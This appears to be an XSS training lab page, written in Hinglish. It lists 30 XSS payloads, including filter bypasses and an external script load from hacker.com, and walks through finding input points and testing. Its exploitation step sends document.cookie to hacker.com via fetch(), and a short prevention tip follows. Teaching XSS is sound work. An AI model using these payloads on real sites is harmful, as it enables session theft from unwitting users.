@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 11 Manual | XSS Attack | Owlguard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="lab11.css" rel="stylesheet">
+   <link rel="icon" type="image/png" href="favicon.jpeg">
+</head>
+<body>
+
+    <nav>
+        <a href="index.html" class="logo">OWLGUARD</a>
+        <a href="index.html" style="color: #fff; text-decoration: none;"><i class="fas fa-arrow-left"></i> HOME </a>
+    </nav>
+
+    <header class="lab-header">
+        <p>LAB 11</p>
+        <h1>Cross-Site Scripting (XSS) Manual</h1>
+        <p>Client-side scripts inject karke users ka session data chori karna.</p>
+    </header>
+
+    <div class="content-container">
+
+        <section class="commands-section">
+            <h2><i class="fas fa-code"></i> 30 Essential XSS Payloads</h2>
+            <p>In payloads ko search bar ya forms mein daal kar test karein.</p>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Payload / Method</th>
+                            <th>Purpose (Kya hoga?)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td class="payload-text">&lt;script&gt;alert('XSS')&lt;/script&gt;</td><td>Basic Alert (Vulnerability check).</td></tr>
+                        <tr><td class="payload-text">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</td><td>Session cookies display karna.</td></tr>
+                        <tr><td class="payload-text">&lt;img src=x onerror=alert(1)&gt;</td><td>Image tag bypass (Agar script tag blocked ho).</td></tr>
+                        <tr><td class="payload-text">&lt;svg onload=alert(1)&gt;</td><td>SVG tag bypass for modern browsers.</td></tr>
+                        <tr><td class="payload-text">&lt;body onload=alert(1)&gt;</td><td>Body tag injection.</td></tr>
+                        <tr><td class="payload-text">&lt;details open ontoggle=alert(1)&gt;</td><td>HTML5 tag bypass technique.</td></tr>
+                        <tr><td class="payload-text">&lt;iframe src="javascript:alert(1)"&gt;</td><td>Iframe base injection.</td></tr>
+                        <tr><td class="payload-text">&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;</td><td>Link based XSS.</td></tr>
+                        <tr><td class="payload-text">&lt;video&gt;&lt;source onerror="alert(1)"&gt;</td><td>Video tag exploitation.</td></tr>
+                        <tr><td class="payload-text">&lt;marquee onstart=alert(1)&gt;</td><td>Old HTML tag bypass.</td></tr>
+                        <tr><td class="payload-text">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</td><td>Breaking out of input attributes.</td></tr>
+                        <tr><td class="payload-text">'&gt;&lt;script&gt;alert(1)&lt;/script&gt;</td><td>Single quote attribute breakout.</td></tr>
+                        <tr><td class="payload-text">javascript:alert(1)</td><td>URL based injection.</td></tr>
+                        <tr><td class="payload-text">&lt;script src="http://hacker.com/x.js"&gt;</td><td>External script loading.</td></tr>
+                        <tr><td class="payload-text">xsstrike -u "URL"</td><td>Automated XSS scanning tool.</td></tr>
+                        <tr><td class="payload-text">dalfox url "URL"</td><td>Modern fast XSS scanner.</td></tr>
+                        <tr><td class="payload-text">prompt(8)</td><td>Instead of alert, use prompt.</td></tr>
+                        <tr><td class="payload-text">confirm(8)</td><td>Instead of alert, use confirm box.</td></tr>
+                        <tr><td class="payload-text">&lt;object data="javascript:alert(1)"&gt;</td><td>Object tag injection.</td></tr>
+                        <tr><td class="payload-text">&lt;math&gt;&lt;brute href="javascript:alert(1)"&gt;</td><td>Advanced MathML bypass.</td></tr>
+                        <tr><td class="payload-text">&lt;base href="javascript:alert(1)//"&gt;</td><td>Base tag hijacking.</td></tr>
+                        <tr><td class="payload-text">&lt;embed src="javascript:alert(1)"&gt;</td><td>Embed tag injection.</td></tr>
+                        <tr><td class="payload-text">&lt;form action="javascript:alert(1)"&gt;</td><td>Form action hijacking.</td></tr>
+                        <tr><td class="payload-text">&lt;button onfocus=alert(1) autofocus&gt;</td><td>Autofocus event bypass.</td></tr>
+                        <tr><td class="payload-text">&lt;input onfocus=alert(1) autofocus&gt;</td><td>Input event bypass.</td></tr>
+                        <tr><td class="payload-text">&lt;textarea onfocus=alert(1) autofocus&gt;</td><td>Textarea event bypass.</td></tr>
+                        <tr><td class="payload-text">&lt;keygen onfocus=alert(1) autofocus&gt;</td><td>Keygen tag bypass.</td></tr>
+                        <tr><td class="payload-text">&lt;frameset onload=alert(1)&gt;</td><td>Legacy frameset injection.</td></tr>
+                        <tr><td class="payload-text">&lt;link rel="import" href="x.html"&gt;</td><td>HTML Import bypass.</td></tr>
+                        <tr><td class="payload-text">&lt;style&gt;@import 'javascript:alert(1)';&lt;/style&gt;</td><td>CSS Import injection.</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <section class="step-card">
+            <h3><i class="fas fa-search"></i> Step 1: Finding Entry Points</h3>
+            <p>Website par search bars, comment box, ya contact forms dhunde. Wahan koi normal text (jaise "Owlguard") likh kar enter karein aur dekhein ki wo page par kahan display ho raha hai.</p>
+            <div class="logic-box">
+                <strong>Logic:</strong> Agar website aapke input ko bina "sanitize" (saaf) kiye screen par dikha rahi hai, toh wo XSS ke liye vulnerable hai.
+            </div>
+        </section>
+
+        <section class="step-card">
+            <h3><i class="fas fa-vial"></i> Step 2: Testing Vulnerability</h3>
+            <p>Ab normal text ki jagah basic payload daalein: <br> <code>&lt;script&gt;alert('Vulnerable')&lt;/script&gt;</code></p>
+            <p>Agar browser mein "Vulnerable" ka popup aata hai, toh aapne darwaza dhund liya hai.</p>
+        </section>
+
+        <section class="step-card">
+            <h3><i class="fas fa-user-secret"></i> Step 3: Exploitation (Stealing Cookies)</h3>
+            <p>Real attack mein hum alert nahi dikhate, balki user ki cookies churate hain. Hacker ek script inject karta hai jo cookies hacker ke server par bhej deti hai.</p>
+            <div class="terminal-box">&lt;script&gt;fetch('http://hacker.com/log?c=' + document.cookie);&lt;/script&gt;</div>
+        </section>
+
+        <section class="step-card" style="border-left: 5px solid #ff4b2b;">
+            <h3><i class="fas fa-shield-alt"></i> Prevention Tip</h3>
+            <p>XSS se bachne ke liye hamesha <strong>Input Validation</strong> aur <strong>Output Encoding</strong> ka use karein. Kabhi bhi user ke input ko raw HTML mein print na karein.</p>
+        </section>
+
+    </div>
+
+    <footer>
+        <p>&copy; 2026 | Secured by OwlGuard | All Rights Reserved</p>
+    </footer>
+
+</body>
+</html>
